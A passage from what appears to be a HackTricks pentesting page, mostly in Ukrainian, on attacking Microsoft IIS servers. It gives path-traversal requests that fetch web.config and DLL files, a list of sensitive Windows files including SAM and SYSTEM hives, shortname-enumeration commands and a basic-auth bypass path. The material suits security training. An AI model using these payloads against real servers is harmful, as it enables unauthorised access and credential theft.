# IIS - Internet Information Services

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Test executable file extensions:

* asp
* aspx
* config
* php

## –í–∏—Ç—ñ–∫–∞–Ω–Ω—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó IP-–∞–¥—Ä–µ—Å–∏

–ù–∞ –±—É–¥—å-—è–∫–æ–º—É —Å–µ—Ä–≤–µ—Ä—ñ IIS, –¥–µ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ 302, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–¥–∞–ª–∏—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ Host —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ HTTP/1.0, –∞ –≤ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑–∞–≥–æ–ª–æ–≤–æ–∫ Location –º–æ–∂–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –≤–Ω—É—Ç—Ä—ñ—à–Ω—é IP-–∞–¥—Ä–µ—Å—É:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
–í—ñ–¥–ø–æ–≤—ñ–¥—å, —â–æ —Ä–æ–∑–∫—Ä–∏–≤–∞—î –≤–Ω—É—Ç—Ä—ñ—à–Ω—é IP-–∞–¥—Ä–µ—Å—É:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## –í–∏–∫–æ–Ω–∞–Ω–Ω—è .config —Ñ–∞–π–ª—ñ–≤

–í–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ .config —Ñ–∞–π–ª–∏ —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ó—Ö –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É. –û–¥–∏–Ω –∑—ñ —Å–ø–æ—Å–æ–±—ñ–≤ –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ - –¥–æ–¥–∞—Ç–∏ –∫–æ–¥ –≤ –∫—ñ–Ω–µ—Ü—å —Ñ–∞–π–ª—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ HTML –∫–æ–º–µ–Ω—Ç–∞—Ä—è: [–ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ —Ç—É—Ç](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —Ç–∞ —Ç–µ—Ö–Ω—ñ–∫ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ [—Ç—É—Ç](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## –ë—Ä—É—Ç—Ñ–æ—Ä—Å –≤–∏—è–≤–ª–µ–Ω–Ω—è IIS

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Å–ø–∏—Å–æ–∫, —è–∫–∏–π —è —Å—Ç–≤–æ—Ä–∏–≤:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

–í—ñ–Ω –±—É–≤ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π —à–ª—è—Ö–æ–º –æ–±'—î–¥–Ω–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö —Å–ø–∏—Å–∫—ñ–≤:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –π–æ–≥–æ –±–µ–∑ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –±—É–¥—å-—è–∫–æ–≥–æ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, —Ñ–∞–π–ª–∏, —è–∫–∏–º —Ü–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ, –≤–∂–µ –º–∞—é—Ç—å –π–æ–≥–æ.

## –ü–µ—Ä–µ—Ö—ñ–¥ –ø–æ —à–ª—è—Ö—É

### –í–∏—Ç—ñ–∫ –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø–æ–≤–Ω–∏–π –æ–ø–∏—Å –∑–∞ –∞–¥—Ä–µ—Å–æ—é: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
–£ –ø—ñ–¥—Å—É–º–∫—É, —î –∫—ñ–ª—å–∫–∞ web.config —Ñ–∞–π–ª—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–∞–ø–æ–∫ –ø—Ä–æ–≥—Ä–∞–º–∏ –∑ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º–∏ –Ω–∞ "**assemblyIdentity**" —Ñ–∞–π–ª–∏ —Ç–∞ "**namespaces**". –ó —Ü—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –º–æ–∂–ª–∏–≤–æ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è **–¥–µ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω—ñ –≤–∏–∫–æ–Ω—É–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏** —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —ó—Ö.\
–ó **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö Dll** —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ **–Ω–æ–≤—ñ –ø—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω**, –¥–æ —è–∫–∏—Ö —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ web.config —Ñ–∞–π–ª, —â–æ–± –∑–Ω–∞–π—Ç–∏ –Ω–æ–≤—ñ –ø—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω —Ç–∞ assemblyIdentity.\
–¢–∞–∫–æ–∂ —Ñ–∞–π–ª–∏ **connectionstrings.config** —Ç–∞ **global.asax** –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ —Ü—ñ–∫–∞–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.\\
{% endhint %}

–£ **.Net MVC –¥–æ–¥–∞—Ç–∫–∞—Ö** —Ñ–∞–π–ª **web.config** –≤—ñ–¥—ñ–≥—Ä–∞—î –≤–∞–∂–ª–∏–≤—É —Ä–æ–ª—å, –≤–∫–∞–∑—É—é—á–∏ –Ω–∞ –∫–æ–∂–µ–Ω –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª, –Ω–∞ —è–∫–∏–π –ø–æ–∫–ª–∞–¥–∞—î—Ç—å—Å—è –ø—Ä–æ–≥—Ä–∞–º–∞ —á–µ—Ä–µ–∑ XML —Ç–µ–≥–∏ **"assemblyIdentity"**.

### **–î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤**

–ü—Ä–∏–∫–ª–∞–¥ –¥–æ—Å—Ç—É–ø—É –¥–æ —Ñ–∞–π–ª—É **web.config** –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂—á–µ:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
–¶–µ–π –∑–∞–ø–∏—Ç –≤–∏—è–≤–ª—è—î —Ä—ñ–∑–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ç–∞ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫:

* **EntityFramework** –≤–µ—Ä—Å—ñ—è
* **AppSettings** –¥–ª—è –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫, –≤–∞–ª—ñ–¥–∞—Ü—ñ—ó –∫–ª—ñ—î–Ω—Ç—ñ–≤ —Ç–∞ JavaScript
* **System.web** –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è
* **System.webServer** –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –º–æ–¥—É–ª—ñ–≤
* **Runtime** –ø—Ä–∏–≤'—è–∑–∫–∏ –∑–±—ñ—Ä–æ–∫ –¥–ª—è —á–∏—Å–ª–µ–Ω–Ω–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫, —Ç–∞–∫–∏—Ö —è–∫ **Microsoft.Owin**, **Newtonsoft.Json** —Ç–∞ **System.Web.Mvc**

–¶—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç–µ, —â–æ –ø–µ–≤–Ω—ñ —Ñ–∞–π–ª–∏, —Ç–∞–∫—ñ —è–∫ **/bin/WebGrease.dll**, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω—ñ –≤ –ø–∞–ø—Ü—ñ /bin –ø—Ä–æ–≥—Ä–∞–º–∏.

### **–§–∞–π–ª–∏ –∫–æ—Ä–µ–Ω–µ–≤–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó**

–§–∞–π–ª–∏, –∑–Ω–∞–π–¥–µ–Ω—ñ –≤ –∫–æ—Ä–µ–Ω–µ–≤—ñ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó, —Ç–∞–∫—ñ —è–∫ **/global.asax** —Ç–∞ **/connectionstrings.config** (—è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å —á—É—Ç–ª–∏–≤—ñ –ø–∞—Ä–æ–ª—ñ), —î –≤–∞–∂–ª–∏–≤–∏–º–∏ –¥–ª—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ —Ä–æ–±–æ—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–∏.

### **–ü—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω —Ç–∞ Web.Config**

–î–æ–¥–∞—Ç–∫–∏ MVC —Ç–∞–∫–æ–∂ –≤–∏–∑–Ω–∞—á–∞—é—Ç—å –¥–æ–¥–∞—Ç–∫–æ–≤—ñ **web.config —Ñ–∞–π–ª–∏** –¥–ª—è —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏—Ö –ø—Ä–æ—Å—Ç–æ—Ä—ñ–≤ —ñ–º–µ–Ω, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –ø–æ–≤—Ç–æ—Ä—é–≤–∞–Ω–∏—Ö –¥–µ–∫–ª–∞—Ä–∞—Ü—ñ–π —É –∫–æ–∂–Ω–æ–º—É —Ñ–∞–π–ª—ñ, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∞ –ø—Ä–∏–∫–ª–∞–¥—ñ –∑–∞–ø–∏—Ç—É –Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —ñ–Ω—à–æ–≥–æ **web.config**:
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL**

–ó–≥–∞–¥–∫–∞ –ø—Ä–æ –≤–ª–∞—Å–Ω–∏–π –ø—Ä–æ—Å—Ç—ñ—Ä —ñ–º–µ–Ω –≤–∫–∞–∑—É—î –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å DLL –∑ –Ω–∞–∑–≤–æ—é "**WebApplication1**" —É –∫–∞—Ç–∞–ª–æ–∑—ñ /bin. –ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –ø–æ–∫–∞–∑–∞–Ω–æ –∑–∞–ø–∏—Ç –Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è **WebApplication1.dll**:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
–¶–µ –≤–∫–∞–∑—É—î –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —ñ–Ω—à–∏—Ö –≤–∞–∂–ª–∏–≤–∏—Ö DLL, —Ç–∞–∫–∏—Ö —è–∫ **System.Web.Mvc.dll** —Ç–∞ **System.Web.Optimization.dll**, —É –∫–∞—Ç–∞–ª–æ–∑—ñ /bin.

–£ —Å—Ü–µ–Ω–∞—Ä—ñ—ó, –¥–µ DLL —ñ–º–ø–æ—Ä—Ç—É—î –ø—Ä–æ—Å—Ç—ñ—Ä —ñ–º–µ–Ω –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **WebApplication1.Areas.Minded**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑—Ä–æ–±–∏—Ç–∏ –≤–∏—Å–Ω–æ–≤–æ–∫ –ø—Ä–æ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è —ñ–Ω—à–∏—Ö —Ñ–∞–π–ª—ñ–≤ web.config —É –ø–µ—Ä–µ–¥–±–∞—á—É–≤–∞–Ω–∏—Ö —à–ª—è—Ö–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ **/area-name/Views/**, —â–æ –º—ñ—Å—Ç—è—Ç—å —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —ñ–Ω—à—ñ DLL —É –ø–∞–ø—Ü—ñ /bin. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞–ø–∏—Ç –¥–æ **/Minded/Views/web.config** –º–æ–∂–µ –≤–∏—è–≤–∏—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ –ø—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω, —è–∫—ñ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —ñ–Ω—à–æ—ó DLL, **WebApplication1.AdditionalFeatures.dll**.

### –ó–∞–≥–∞–ª—å–Ω—ñ —Ñ–∞–π–ª–∏

–ó [—Ç—É—Ç](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

–Ø–∫—â–æ –≤–∏ –±–∞—á–∏—Ç–µ –ø–æ–º–∏–ª–∫—É, –ø–æ–¥—ñ–±–Ω—É –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ—ó:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —Å–µ—Ä–≤–µ—Ä **–Ω–µ –æ—Ç—Ä–∏–º–∞–≤ –ø—Ä–∞–≤–∏–ª—å–Ω–µ —ñ–º'—è –¥–æ–º–µ–Ω—É** –≤ –∑–∞–≥–æ–ª–æ–≤–∫—É Host.\
–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–¥–∏–≤–∏—Ç–∏—Å—è –Ω–∞ –Ω–∞–¥–∞–Ω–∏–π **SSL —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç** —ñ, –º–æ–∂–ª–∏–≤–æ, –∑–Ω–∞–π–¥–µ—Ç–µ —Ç–∞–º —ñ–º'—è –¥–æ–º–µ–Ω—É/–ø—ñ–¥–¥–æ–º–µ–Ω—É. –Ø–∫—â–æ –π–æ–≥–æ —Ç–∞–º –Ω–µ–º–∞—î, –≤–∞–º, –º–æ–∂–ª–∏–≤–æ, –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ **–±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ VHosts**, –ø–æ–∫–∏ –Ω–µ –∑–Ω–∞–π–¥–µ—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π.

## –°—Ç–∞—Ä—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ IIS, –Ω–∞ —è–∫—ñ –≤–∞—Ä—Ç–æ –∑–≤–µ—Ä–Ω—É—Ç–∏ —É–≤–∞–≥—É

### –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å/—Ñ—É–Ω–∫—Ü—ñ—è —Å–∏–º–≤–æ–ª—É —Ç–∏–ª—å–¥–∏ ‚Äú\~‚Äù Microsoft IIS ‚Äì –†–æ–∑–∫—Ä–∏—Ç—Ç—è –∫–æ—Ä–æ—Ç–∫–∏—Ö —ñ–º–µ–Ω —Ñ–∞–π–ª—ñ–≤/–ø–∞–ø–æ–∫

–í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –ø–∞–ø–∫–∏ —Ç–∞ —Ñ–∞–π–ª–∏** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–∂–Ω–æ—ó –≤–∏—è–≤–ª–µ–Ω–æ—ó –ø–∞–ø–∫–∏ (–Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Ü–µ –≤–∏–º–∞–≥–∞—î –±–∞–∑–æ–≤–æ—ó –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó), –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü—é **—Ç–µ—Ö–Ω—ñ–∫—É**.\
–û—Å–Ω–æ–≤–Ω–µ –æ–±–º–µ–∂–µ–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏, —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä –≤—Ä–∞–∑–ª–∏–≤–∏–π, –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ **–≤–æ–Ω–∞ –º–æ–∂–µ –∑–Ω–∞–π—Ç–∏ –ª–∏—à–µ –ø–µ—Ä—à—ñ 6 –ª—ñ—Ç–µ—Ä —ñ–º–µ–Ω—ñ –∫–æ–∂–Ω–æ–≥–æ —Ñ–∞–π–ª—É/–ø–∞–ø–∫–∏ —Ç–∞ –ø–µ—Ä—à—ñ 3 –ª—ñ—Ç–µ—Ä–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è** —Ñ–∞–π–ª—ñ–≤.

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

–û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è: [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **metasploit**: `use scanner/http/iis_shortname_scanner`

### –û–±—Ö—ñ–¥ –±–∞–∑–æ–≤–æ—ó –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó

**–û–±—ñ–π—Ç–∏** –±–∞–∑–æ–≤—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é (**IIS 7.5**), –Ω–∞–º–∞–≥–∞—é—á–∏—Å—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ: `/admin:$i30:$INDEX_ALLOCATION/admin.php` –∞–±–æ `/admin::$INDEX_ALLOCATION/admin.php`

–í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø–æ—î–¥–Ω–∞—Ç–∏** —Ü—é **–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å** –∑ –æ—Å—Ç–∞–Ω–Ω—å–æ—é, —â–æ–± –∑–Ω–∞–π—Ç–∏ –Ω–æ–≤—ñ **–ø–∞–ø–∫–∏** —Ç–∞ **–æ–±—ñ–π—Ç–∏** –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é.

## ASP.NET Trace.AXD —É–≤—ñ–º–∫–Ω–µ–Ω–æ –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è

ASP.NET –≤–∫–ª—é—á–∞—î —Ä–µ–∂–∏–º –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è, —ñ –π–æ–≥–æ —Ñ–∞–π–ª –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è `trace.axd`.

–í—ñ–Ω –∑–±–µ—Ä—ñ–≥–∞—î –¥—É–∂–µ –¥–µ—Ç–∞–ª—å–Ω–∏–π –∂—É—Ä–Ω–∞–ª —É—Å—ñ—Ö –∑–∞–ø–∏—Ç—ñ–≤, –∑—Ä–æ–±–ª–µ–Ω–∏—Ö –¥–æ –ø—Ä–æ–≥—Ä–∞–º–∏ –ø—Ä–æ—Ç—è–≥–æ–º –ø–µ–≤–Ω–æ–≥–æ –ø–µ—Ä—ñ–æ–¥—É —á–∞—Å—É.

